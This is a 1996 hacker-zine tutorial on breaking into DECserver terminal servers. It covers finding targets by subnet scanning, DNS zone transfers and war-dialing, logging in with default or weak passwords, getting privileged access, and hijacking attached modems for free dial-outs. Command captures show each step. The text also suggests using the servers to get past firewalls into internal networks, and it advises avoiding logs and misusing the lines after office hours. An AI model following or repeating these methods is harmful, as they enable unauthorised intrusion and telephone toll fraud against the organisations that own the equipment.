   Global OutDials on DECservers                  - Italy -   May 1996

þ Finding a DECserver

 The DECserver is a terminal server, it connects its terminals to
 hosts available on an Ethernet Local Area Network.
 DecServers are usually reachable via telnet and sometimes via dialup.
 Via telnet you need to scan/search for them in the internet,
 Via dialups use a good Carrier Scanner like ToneLoc or THC-Scan.

Telnet:
 About telnet connection decservers have normal ip addresses,
 but what we are interested in is the alpha address, 'cause almost always
 it starts with "DS"; just something like:
      DS7001.fuck.you.asshole
 and if the owners are very very lame it can even contain the
 string "MODEM" or "DIAL" (wow!) in its alpha address.
 So what I suggest is to combine a brute force scanning with an intelligent
 (smart) behaviour...
 You should first find a route ip address of a university or of a science
 research network or whatelse you (and, after some scanning, your experience)
 think could have such a beautiful device.
 It should be a network big enough to have several vaxes and other machines...
 Note that not always an alpha address starting with "DS"
 leads to a DECserver , i.e. sometimes ultrix machines have an address
 like that.
[I personally made a script to scan subnets from XXX.XXX.0.0 to
 XXX.XXX.255.255 or from XXX.XXX.XXX.0 to XXX.XXX.XXX.255
 and to save only interesting alpha addresses,
 but i don't suggest to use it automatically, in other words
 take it always under control and use your brain!]

 þ Warning: usually scripts like this do a lot of noise;
            think about "lastcomm" "ps" and things like that ...
 þ Warning: to do subnet scanning you need an host with a very fast connection
 þ Warning: CERT SUX !!!!!!   ;)

 NOTE: 
 instead of a script it's wiser to do a zone transfer (for example with
 nslookup or dig) to get all the alpha names in a domain. But this needs
 a) an skilled unix user and b) the target DNS server must allow zone
 transfers. (There are other methods but this article isn't about unix
 hacking ;-) So I only present this better possiblity which not many can
 do reading this article.


Dialup:
 Nothing much to say about scanning these ... just do a fast carrier scan
 of an area overnight and hope you get a dec-server. If you know that a
 company has got dialups and a big computer network, then try to scan
 those local numbers. There aren't much on toll free numbers and those
 are usually more protected.

 If you connect via dialup, you have no problem to recognize it:

------------------------------------------------[FROM alt.2600/#hack.FAQ]------


 But if you connect via telnet it will not appear anything on your screen:

-------------------------[Start Capture]---------------------------------------

telnet> open ds7001.fuck.you.asshole
Trying 123.45.678.910 ...
Connected to ds7001.fuck.you.asshole
Escape character is '^]'.

---------------------------[End Capture]--------------------------------------


 All you have to do is just press enter (it's easy uh?), and it will
 appear a "#" prompt (at this time you are quite sure it's a DECserver),
 echo gets off and ...
 now comes the time to type the password to enter the DEC ...
 I won't tell you the default pwd (which in 99% of my times was the good one)
 'cause .... 'cause shit ! Do I have to tell you everything??? (scan!)
 It's a very very lame password usually one of the firsts that you could think
 of. You have 3 tries, after that it disconnects you. I don't know if there are
 warnings or logs of wrong attempts made, but can tell that IF the password is
 not the default one, then the system administrators take care about security
 very very much, so be careful.
 Typing the right password appears the same screen of the first capture
 (look up!), you are asked a username but it isn't of any importance, just
 type something unsuspicious like just one letter.


þ Once in ... let's find out if there's a modem !

 The "Local> " prompt is the DECserver prompt , I strongly suggest to give a
 "help" command 'cause the dec help is very kind and it will tell you
 more interesting things you can imagine... and you should learn from practice,
 not reading shitty articles like this one from zines <g> !
 Ok, to have an idea of where you are , there are two commands :
 "show users"
 "show services"
 The second one will tell you all the possible connections:

Local> show services

 Reading the description or the service name it's easy to find out a modem.
 If you find it, let's say its name is "DS1MODEM" , you just have to use
 the "connect" command:

-------------------------[Start Capture]---------------------------------------

Local> connect DS1MODEM
Local -010- Session 1 to DS1MODEM on node DS7001 established
atz
OK
atdt004969823282
CONNECT 14400/REL
Press [ENTER] to access L.o.r.E. BBS

-------------------------[End Capture]-----------------------------------------


þ ... A little bit difficult

 If from the "show services" doesn't seem to be any modem (try also strange
 services and services without description) don't lose any hope 'cause often
 devices such as modems are used only by sys-administrators, they create the
 service when they need it and then "CLEAR" it.
 What you have to do is look all the PORTS of the DECserver for modems ...
 Here you use the "SHOW PORT" command:

--------------------------[Start Capture]--------------------------------------

Local> show port 8

Port  8:                               Server: DSLE8
Character Size:            8           Input Speed:               9600
Flow Control:            XON           Output Speed:              9600
Parity:                 None           Signal Control:        Disabled
Stop Bits:           Dynamic           Signal Select:  CTS-DSR-RTS-DTR
Access:                Local           Local Switch:              None
Backwards Switch:       None           Name:                    PORT_8
Break:                 Local           Session Limit:                4
Forwards Switch:        None           Type:                      Ansi
Default Protocol:        LAT
Preferred Service: VAXXX
Authorized Groups:   0
(Current)  Groups:   0
Enabled Characteristics:
Autobaud,  Autoprompt,  Broadcast,  Input Flow Control,  Lock,
Loss Notification,  Message Codes,  Output Flow Control,  Verification


-------------------------------[End Capture]-----------------------------------

 All of these informations are interesting but the one which usually tells
 if a modem is connected to the port is:

Enabled Characteristics:
Dialup, etc..., etc..., etc,...

 So give a look at all ports, if there's nothing interesting throw that DEC
 in the trash ,otherwise you NEED PRIVELEGES to use the modem ...
 In 50% of cases the password to become privileged user is the default one,
 in 85% of cases it's a lame one ...
 Once again I won't tell you the privileged user default password (which is
 different from the first password) but once again I say it's an absolutely
 lame pwd!
 To become Privileged user do:

Local> set priv
Password>

 Once again have 3 tries ,but this time I'm sure that an invalid attempt
 is logged with a certain warning value!
 If after you've typed the pwd it answers with the "Local>" prompt it
 means you're a privileged user , and finally you can do :

Local> set port 1 service FUCKYOU
Local> connect FUCKYOU

 And enjoy your dialout ;)


þ Epilogue

 There's a lot to learn about DECservers, about all the settings and options
 you can switch, so experiment ... they are useful to penetrate systems
 and can tell you very much about a network ... lot of DECs have also
 an active telnet command ...

 And you can often find valid telnet targets with the command "show domain".
 So these DECservers can also be useful to pass a Firewall (!) and to enter
 internal networks which would normally not available (not connected to
 the internet) !  But this once again goes to far into unix hacking ...

 But be careful do not abuse too much, use your brain ...
 Think that sooner or later a phone bill arrives to someone and ....
 Use modem outdials only in hours when you know offices and machines' rooms
 are closed ...

Greets and Have Fun!
